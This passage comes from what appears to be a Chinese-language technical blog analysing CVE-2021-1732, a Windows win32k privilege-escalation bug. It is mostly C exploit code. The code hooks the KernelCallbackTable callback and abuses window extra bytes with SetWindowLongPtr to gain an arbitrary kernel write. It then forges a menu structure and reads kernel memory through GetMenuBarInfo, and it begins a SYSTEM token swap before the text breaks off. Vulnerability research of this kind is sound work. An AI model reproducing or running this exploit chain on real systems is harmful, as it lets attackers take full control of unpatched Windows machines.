class="string">&quot;Failed to find location of exported function &#x27;IsMenu&#x27; within user32.dll\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> uiHMValidateHandleOffset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">		BYTE* test = pIsMenu + i;</span><br><span class="line">		<span class="keyword">if</span> (*test == <span class="number">0xE8</span>) &#123;</span><br><span class="line">			uiHMValidateHandleOffset = i + <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (uiHMValidateHandleOffset == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to find offset of HMValidateHandle from location of &#x27;IsMenu&#x27;\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> addr = *(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(pIsMenu + uiHMValidateHandleOffset);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)pIsMenu - (<span class="keyword">unsigned</span> <span class="keyword">int</span>)hUser32) + addr;</span><br><span class="line">	<span class="comment">//The +11 is to skip the padding bytes as on Windows 10 these aren&#x27;t nops</span></span><br><span class="line">	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + <span class="number">11</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">HWND <span class="title">GuessHwnd</span><span class="params">(DWORD64* pBaseAddress, DWORD dwRegionSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD64 qwBaseAddressBak = *pBaseAddress;</span><br><span class="line">	DWORD64 qwBaseAddress = *pBaseAddress;</span><br><span class="line">	DWORD dwRegionSizeBak = dwRegionSize;</span><br><span class="line">	HWND hwndMagicWindow = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span> (*(WORD*)qwBaseAddress != g_nRandom &amp; dwRegionSize &gt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			qwBaseAddress += <span class="number">2</span>;</span><br><span class="line">			dwRegionSize--;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//获取不到才会走下面的步骤</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (*(DWORD*)((DWORD*)qwBaseAddress + (<span class="number">0x18</span> &gt;&gt; <span class="number">2</span>) - (<span class="number">0xc8</span> &gt;&gt; <span class="number">2</span>)) != <span class="number">0x8000000</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			qwBaseAddress = qwBaseAddress + <span class="number">4</span>;</span><br><span class="line">			DWORD64 qwSub = qwBaseAddressBak - qwBaseAddress;</span><br><span class="line">			dwRegionSize = dwRegionSizeBak + qwSub;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		hwndMagicWindow = (HWND) * (DWORD*)(qwBaseAddress - <span class="number">0xc8</span>);</span><br><span class="line">		<span class="keyword">if</span> (hwndMagicWindow)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> hwndMagicWindow;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD64  <span class="title">MyxxxClientAllocWindowClassExtraBytes</span><span class="params">(DWORD64* a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD64 dwTemp = *a1;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dwTemp == g_nRandom)</span><br><span class="line">	&#123;</span><br><span class="line">		HWND hwndMagic = GuessHwnd(&amp;g_qwMinBaseAddress, g_qwRegionSize);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;MagciHwnd==%p\r\n&quot;</span>, hwndMagic);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (hwndMagic)</span><br><span class="line">		&#123;</span><br><span class="line">			g_pfnNtUserConsoleControl(<span class="number">6</span>i64, &amp;hwndMagic, <span class="number">0x10</span>);</span><br><span class="line">			DWORD64 qwRet = OffsetToDesktopHeap_min;</span><br><span class="line"></span><br><span class="line">			g_pfnNtCallbackReturn(&amp;qwRet, <span class="number">24</span>i64, <span class="number">0</span>i64);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD64 dwTest = *((PULONG64) * (a1 - <span class="number">11</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> OldxxxClientAllocWindowClassExtraBytes(a1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">HookClientAllocWindowClassExtraBytes</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL bRet = TRUE;</span><br><span class="line">	DWORD dwOldProtect;</span><br><span class="line"></span><br><span class="line">	g_pfnNtUserConsoleControl = (fnNtUserConsoleControl)GetProcAddress(GetModuleHandleA(<span class="string">&quot;win32u.dll&quot;</span>), <span class="string">&quot;NtUserConsoleControl&quot;</span>);</span><br><span class="line">	g_pfnNtCallbackReturn = (fnNtCallbackReturn)GetProcAddress(GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtCallbackReturn&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取 KernelCallbackTable gs段寄存器 0x60位置为PEB</span></span><br><span class="line">	<span class="comment">// PEB 偏移0x58位置为KernelCallbackTable</span></span><br><span class="line">	DWORD64	KernelCallbackTable = *(DWORD64*)(__readgsqword(<span class="number">0x60</span>u) + <span class="number">0x58</span>);</span><br><span class="line">	<span class="comment">// 0x3d8位置为函数 user32!_xxxClientAllocWindowClassExtraBytes:</span></span><br><span class="line">	OldxxxClientAllocWindowClassExtraBytes = (fnxxxClientAllocWindowClassExtraBytes) * (DWORD64*)(KernelCallbackTable + <span class="number">0x3D8</span>);<span class="comment">// 0x3d8位置为函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	VirtualProtect((LPVOID)(KernelCallbackTable + <span class="number">0x3D8</span>), <span class="number">0x300</span>ui64, <span class="number">0x40</span>u, &amp;dwOldProtect);</span><br><span class="line">	*(DWORD64*)(KernelCallbackTable + <span class="number">0x3D8</span>) = (DWORD64)MyxxxClientAllocWindowClassExtraBytes;</span><br><span class="line">	VirtualProtect((LPVOID)(KernelCallbackTable + <span class="number">0x3D8</span>), <span class="number">0x300</span>ui64, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT __fastcall <span class="title">MyWndProc</span><span class="params">(HWND a1, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (a2 != <span class="number">2</span>)</span><br><span class="line">		<span class="keyword">return</span> DefWindowProcW(a1, a2, a3, a4);</span><br><span class="line">	PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InitWindowsClass</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> WndNum = <span class="number">10</span>;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">MEMORY_BASIC_INFORMATION</span> <span class="title">Buffer</span> =</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">	srand(time(<span class="number">0</span>i64));</span><br><span class="line">	g_nRandom = (rand() % <span class="number">255</span> + <span class="number">0x1234</span>) | <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	WNDCLASSEXW wndClass = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">	wndClass.lpfnWndProc = (WNDPROC)MyWndProc;</span><br><span class="line">	wndClass.cbSize = <span class="number">80</span>;</span><br><span class="line">	wndClass.style = <span class="number">3</span>;</span><br><span class="line">	wndClass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">	wndClass.cbWndExtra = <span class="number">0x1000</span>;</span><br><span class="line">	wndClass.hInstance = GetModuleHandleW(<span class="number">0</span>i64);</span><br><span class="line">	wndClass.lpszClassName = <span class="string">L&quot;normalClass&quot;</span>;</span><br><span class="line">	ATOM g_lpWcxNormal = RegisterClassExW(&amp;wndClass);</span><br><span class="line">	<span class="comment">//g_nRandom</span></span><br><span class="line">	wndClass.cbWndExtra = g_nRandom;</span><br><span class="line">	wndClass.lpszClassName = <span class="string">L&quot;magicClass&quot;</span>;</span><br><span class="line">	ATOM g_lpWcxMagic = RegisterClassExW(&amp;wndClass);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; WndNum; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		g_hwnd[i]= CreateWindowExW(</span><br><span class="line">						WS_EX_NOACTIVATE,</span><br><span class="line">						(LPCWSTR)(<span class="keyword">unsigned</span> __int16)g_lpWcxNormal,</span><br><span class="line">						<span class="string">L&quot;windows&quot;</span>,</span><br><span class="line">						<span class="number">0x8000000</span>u,</span><br><span class="line">						<span class="number">0</span>,</span><br><span class="line">						<span class="number">0</span>,</span><br><span class="line">						<span class="number">0</span>,</span><br><span class="line">						<span class="number">0</span>,</span><br><span class="line">						<span class="number">0</span>i64,</span><br><span class="line">						<span class="literal">NULL</span>,</span><br><span class="line">						GetModuleHandleW(<span class="number">0</span>i64),</span><br><span class="line">						<span class="number">0</span>i64);</span><br><span class="line">		g_ptagWNDk[i] = (DWORD64)pHmValidateHandle(g_hwnd[i], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">		VirtualQuery((LPVOID)g_ptagWNDk[i], &amp;Buffer, <span class="number">0x30</span>ui64);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		typedef struct _MEMORY_BASIC_INFORMATION &#123;</span></span><br><span class="line"><span class="comment">			PVOID BaseAddress;</span></span><br><span class="line"><span class="comment">			PVOID AllocationBase;</span></span><br><span class="line"><span class="comment">			DWORD AllocationProtect;</span></span><br><span class="line"><span class="comment">			SIZE_T RegionSize;</span></span><br><span class="line"><span class="comment">			DWORD State;</span></span><br><span class="line"><span class="comment">			DWORD Protect;</span></span><br><span class="line"><span class="comment">			DWORD Type;</span></span><br><span class="line"><span class="comment">		&#125; MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="keyword">if</span> (g_qwMinBaseAddress == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			g_qwMinBaseAddress = (DWORD64)Buffer.BaseAddress;</span><br><span class="line">			g_qwRegionSize = (DWORD64)Buffer.RegionSize;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (g_qwMinBaseAddress &gt; (DWORD64)Buffer.BaseAddress)</span><br><span class="line">			&#123;</span><br><span class="line">				g_qwMinBaseAddress = (DWORD64)Buffer.BaseAddress;</span><br><span class="line">				g_qwRegionSize = (DWORD64)Buffer.RegionSize;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (*(DWORD*)((<span class="keyword">char</span>*)g_ptagWNDk[<span class="number">0</span>] + <span class="number">8</span>) &lt; *(DWORD*)((<span class="keyword">char</span>*)g_ptagWNDk[<span class="number">1</span>] + <span class="number">8</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		g_ptagWNDK_min = g_ptagWNDk[<span class="number">0</span>];</span><br><span class="line">		g_ptagWNDK_max = g_ptagWNDk[<span class="number">1</span>];</span><br><span class="line">		g_hwnd_min = g_hwnd[<span class="number">0</span>];</span><br><span class="line">		g_hwnd_max = g_hwnd[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		g_ptagWNDK_min = g_ptagWNDk[<span class="number">1</span>];</span><br><span class="line">		g_ptagWNDK_max = g_ptagWNDk[<span class="number">0</span>];</span><br><span class="line">		g_hwnd_min = g_hwnd[<span class="number">1</span>];</span><br><span class="line">		g_hwnd_max = g_hwnd[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	OffsetToDesktopHeap_min = *(DWORD*)(g_ptagWNDK_min + <span class="number">8</span>);</span><br><span class="line">	OffsetToDesktopHeap_max= *(DWORD*)(g_ptagWNDK_max + <span class="number">8</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//改变窗口0的寻址方式，变为桌面堆寻址</span></span><br><span class="line">	g_pfnNtUserConsoleControl(<span class="number">6</span>i64, &amp;g_hwnd_min, <span class="number">0x10</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>i64; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">		DestroyWindow(g_hwnd[i]);</span><br><span class="line"></span><br><span class="line">	g_hwndMagic = CreateWindowExW(</span><br><span class="line">		<span class="number">0x8000000</span>u,</span><br><span class="line">		(LPCWSTR)(<span class="keyword">unsigned</span> __int16)g_lpWcxMagic,</span><br><span class="line">		<span class="string">L&quot;Magicwnd&quot;</span>,</span><br><span class="line">		<span class="number">0x8000000</span>u,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="number">0</span>i64,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		GetModuleHandleW(<span class="number">0</span>i64),</span><br><span class="line">		<span class="number">0</span>i64);</span><br><span class="line"></span><br><span class="line">	SetWindowLongW(g_hwndMagic, <span class="number">0x128</span>, OffsetToDesktopHeap_min);</span><br><span class="line">	SetWindowLongW(g_hwndMagic, <span class="number">0xC8</span>, <span class="number">0xFFFFFFF</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;testnum address : %p\n&quot;</span>, &amp;testnum);</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_max + <span class="number">0x128</span> - OffsetToDesktopHeap_min, (LONG_PTR)&amp;testnum);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;testnum old value : %x&quot;</span>, testnum);</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_max, <span class="number">0</span>, <span class="number">0x1234</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;testnum new value : %x&quot;</span>, testnum);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//printf(&quot;%lx %lx \n&quot;, OffsetToDesktopHeap_min, OffsetToDesktopHeap_max);</span></span><br><span class="line">	<span class="comment">//SetWindowLongW(g_hwndMagic, 0x128, OffsetToDesktopHeap_max);</span></span><br><span class="line">	<span class="comment">//printf(&quot;testnum address : %p\n&quot;, &amp;testnum);</span></span><br><span class="line">	<span class="comment">//getchar();</span></span><br><span class="line">	<span class="comment">//SetWindowLongPtrA(g_hwnd_min, 0x128, (LONG_PTR)&amp;testnum);</span></span><br><span class="line">	<span class="comment">//printf(&quot;testnum old value : %x\n&quot;, testnum);</span></span><br><span class="line">	<span class="comment">//SetWindowLongW(g_hwnd_max, 0, 0x1234);</span></span><br><span class="line">	<span class="comment">//printf(&quot;testnum new value : %x&quot;, testnum);</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Init_CVE_2021_1732</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL bRet = TRUE;</span><br><span class="line">    <span class="keyword">if</span> (!FindHMValidateHandle()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Failed to locate HmValidateHandle, exiting\n&quot;</span>);</span><br><span class="line">		bRet = FALSE;</span><br><span class="line">		<span class="keyword">return</span> bRet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!HookClientAllocWindowClassExtraBytes())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Failed to locate HmValidateHandle, exiting\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	InitWindowsClass();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 程序入口点 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Init_CVE_2021_1732();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到用修改地址用的是SetWindowLongPtrA，这是因为SetWindowLong只能设置DWORD的地址，SetWindowLongPtrA可以设置DWORD64的地址，从第三个参数的大小可以看出。</p>
<p>结果如下。<br><img src="https://s2.loli.net/2023/04/10/fn8sGoZHViTvtDa.png" alt="15.png"></p>
<p>实际上上面的代码，还有一部分被注释掉了，这是我分析过程中发现的，貌似不一定需要通过修改cbWndExtra来让窗口0访问窗口1，我们可以修改normal窗口类的cbWndExtra，让其值至少为0x128+8以上的内存，然后让窗口0的扩展内存变为窗口1的tagWNDk1，这样我们同样可以控制窗口0修改到窗口1的tagWNDk1.pExtraBytes。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lx %lx \n&quot;</span>, OffsetToDesktopHeap_min, OffsetToDesktopHeap_max);</span><br><span class="line">SetWindowLongW(g_hwndMagic, <span class="number">0x128</span>, OffsetToDesktopHeap_max);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;testnum address : %p\n&quot;</span>, &amp;testnum);</span><br><span class="line">getchar();</span><br><span class="line">SetWindowLongPtrA(g_hwnd_min, <span class="number">0x128</span>, (LONG_PTR)&amp;testnum);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;testnum old value : %x\n&quot;</span>, testnum);</span><br><span class="line">SetWindowLongW(g_hwnd_max, <span class="number">0</span>, <span class="number">0x1234</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;testnum new value : %x&quot;</span>, testnum);</span><br></pre></td></tr></table></figure>

<p>结果如下。<br><img src="https://s2.loli.net/2023/04/10/veBkOuTV6bWcXhL.png" alt="16.png"></p>
<p>而且似乎我们可能都不需要窗口1，只用窗口0和窗口2，应该就可以完成写操作。</p>
<h4 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h4><p>这里用到的是xxxGetMenuBarInfo函数，感觉这个技术就是为这个漏洞出现的，其原理是xxxGetMenuBarInfo内部会读取*(spMenu + 0x58)保存的地址，然后读取这个地址的值，然后保存到参数pmbi-&gt;rcBar中，我们就可以通过参数获取到对应地址的值，显而易见，这个读取的条件是能修改那个地址，正好我们的漏洞可以做到这一点。</p>
<p>GetMenuBarInfo的定义。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetMenuBarInfo</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]      HWND         hwnd,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]      LONG         idObject,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]      LONG         idItem,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in, out] PMENUBARINFO pmbi</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMENUBARINFO</span> &#123;</span></span><br><span class="line">  DWORD cbSize;</span><br><span class="line">  RECT  rcBar;</span><br><span class="line">  HMENU hMenu;</span><br><span class="line">  HWND  hwndMenu;</span><br><span class="line">  BOOL  fBarFocused : <span class="number">1</span>;</span><br><span class="line">  BOOL  fFocused : <span class="number">1</span>;</span><br><span class="line">  BOOL  fUnused : <span class="number">30</span>;</span><br><span class="line">&#125; MENUBARINFO, *PMENUBARINFO, *LPMENUBARINFO;</span><br></pre></td></tr></table></figure>

<p>查看xxxGetMenuBarInfo函数，我们想实现任意地址读，需要构造spMenu。<br><img src="https://s2.loli.net/2023/04/10/3ECB6SorHjMUZcT.png" alt="17.png"></p>
<p>这个肯定和窗口的Menu有关，所以我们创建窗口时肯定需要创建Menu，并按照图片中的判断去构造spMenu。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 伪造spMenu</span></span><br><span class="line">HANDLE hProcHeap = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">hProcHeap = GetProcessHeap();</span><br><span class="line">g_qwMenu = (DWORD64)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, <span class="number">0xA0</span>);</span><br><span class="line"></span><br><span class="line">*(PDWORD64)(g_qwMenu + <span class="number">0x98</span>) = (DWORD64)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">*(PDWORD64)(*(PDWORD64)(g_qwMenu + <span class="number">0x98</span>)) = g_qwMenu;</span><br><span class="line"></span><br><span class="line">*(PDWORD64)(g_qwMenu + <span class="number">0x28</span>) = (DWORD64)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, <span class="number">0x200</span>);</span><br><span class="line">*(PDWORD64)(*(PDWORD64)(g_qwMenu + <span class="number">0x28</span>) + <span class="number">0x2C</span>) = <span class="number">1</span>;</span><br><span class="line">*(PDWORD64)(g_qwMenu + <span class="number">0x58</span>) = (DWORD64)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, <span class="number">0x8</span>);</span><br><span class="line">*(PDWORD)(g_qwMenu + <span class="number">0x40</span>) = <span class="number">1</span>;</span><br><span class="line">*(PDWORD)(g_qwMenu + <span class="number">0x44</span>) = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>构造完还不够，我们需要将这个构造的spMenu替换到目标窗口的spMenu上，exp采用了SetWindowLongPtrA函数去设置，当第二个参数nIndex&lt;0时，是可以在额外窗口内存中的指定偏移量设置值，当其值为-12时，是有关于spMenu偏移的设置的。<br><img src="https://s2.loli.net/2023/04/10/Mw75XY3kxrvOEU2.png" alt="18.png"></p>
<p>为了执行其代码，我们需要让*(ptagWNDk+0x1F)的值满足某些属性，但是这点完全可以通过任意地址写实现。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DWORD64 qwStyle = *(PDWORD64)(g_ptagWNDK_max + dwStyleOffset);</span><br><span class="line">qwStyle |= <span class="number">0x4000000000000000</span>;</span><br><span class="line">SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_max + dwStyleOffset - OffsetToDesktopHeap_min, qwStyle);</span><br><span class="line"></span><br><span class="line">SetWindowLongPtrA(g_hwnd_max, GWLP_ID, g_qwMenu);</span><br><span class="line"></span><br><span class="line">qwStyle &amp;= ~<span class="number">0x4000000000000000</span>;</span><br><span class="line">SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_max + dwStyleOffset - OffsetToDesktopHeap_min, qwStyle);</span><br></pre></td></tr></table></figure>

<p>接下来封装一下读取的函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD64 <span class="title">MyRead</span><span class="params">(DWORD64 targetAdress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	BYTE qwRet[<span class="number">8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	MENUBARINFO pmbi = &#123;&#125;;</span><br><span class="line">	pmbi.cbSize = <span class="keyword">sizeof</span>(MENUBARINFO);</span><br><span class="line"></span><br><span class="line">	*(PDWORD64)(*(PDWORD64)(g_qwMenu + <span class="number">0x58</span>)) = targetAdress - <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//printf(&quot;%lx \n&quot;, *(PDWORD64)(*(PDWORD64)(g_qwMenu + 0x58)));</span></span><br><span class="line">	<span class="keyword">if</span> (!GetMenuBarInfo(g_hwnd_max, <span class="number">-3</span>, <span class="number">1</span>, &amp;pmbi))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetMenuBarInfo error&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	*(PDWORD)(qwRet) = pmbi.rcBar.left;        <span class="comment">// 减去 Rect.left，创建窗口时，该值被指定为 0</span></span><br><span class="line">	*(PDWORD)(qwRet + <span class="number">4</span>) = pmbi.rcBar.top;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> *(PDWORD64)qwRet;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试结果如下。<br><img src="https://s2.loli.net/2023/04/10/Dnxqus67ftEw1yU.png" alt="19.png"></p>
<h3 id="替换Token"><a href="#替换Token" class="headerlink" title="替换Token"></a>替换Token</h3><p>现在我们有了任意读写的能力，为了实现提权，所需要的就是system进程的Token地址，和本进程的Token地址。</p>
<p>获取pEPROCESS，exp通过的方式是读取spMenu，通过其成员获取pEPROCESS，这里采用另一个exp的方法，可直接获取到system进程的pEPROCESS。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ULONG64 <span class="title">GetNTBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG64 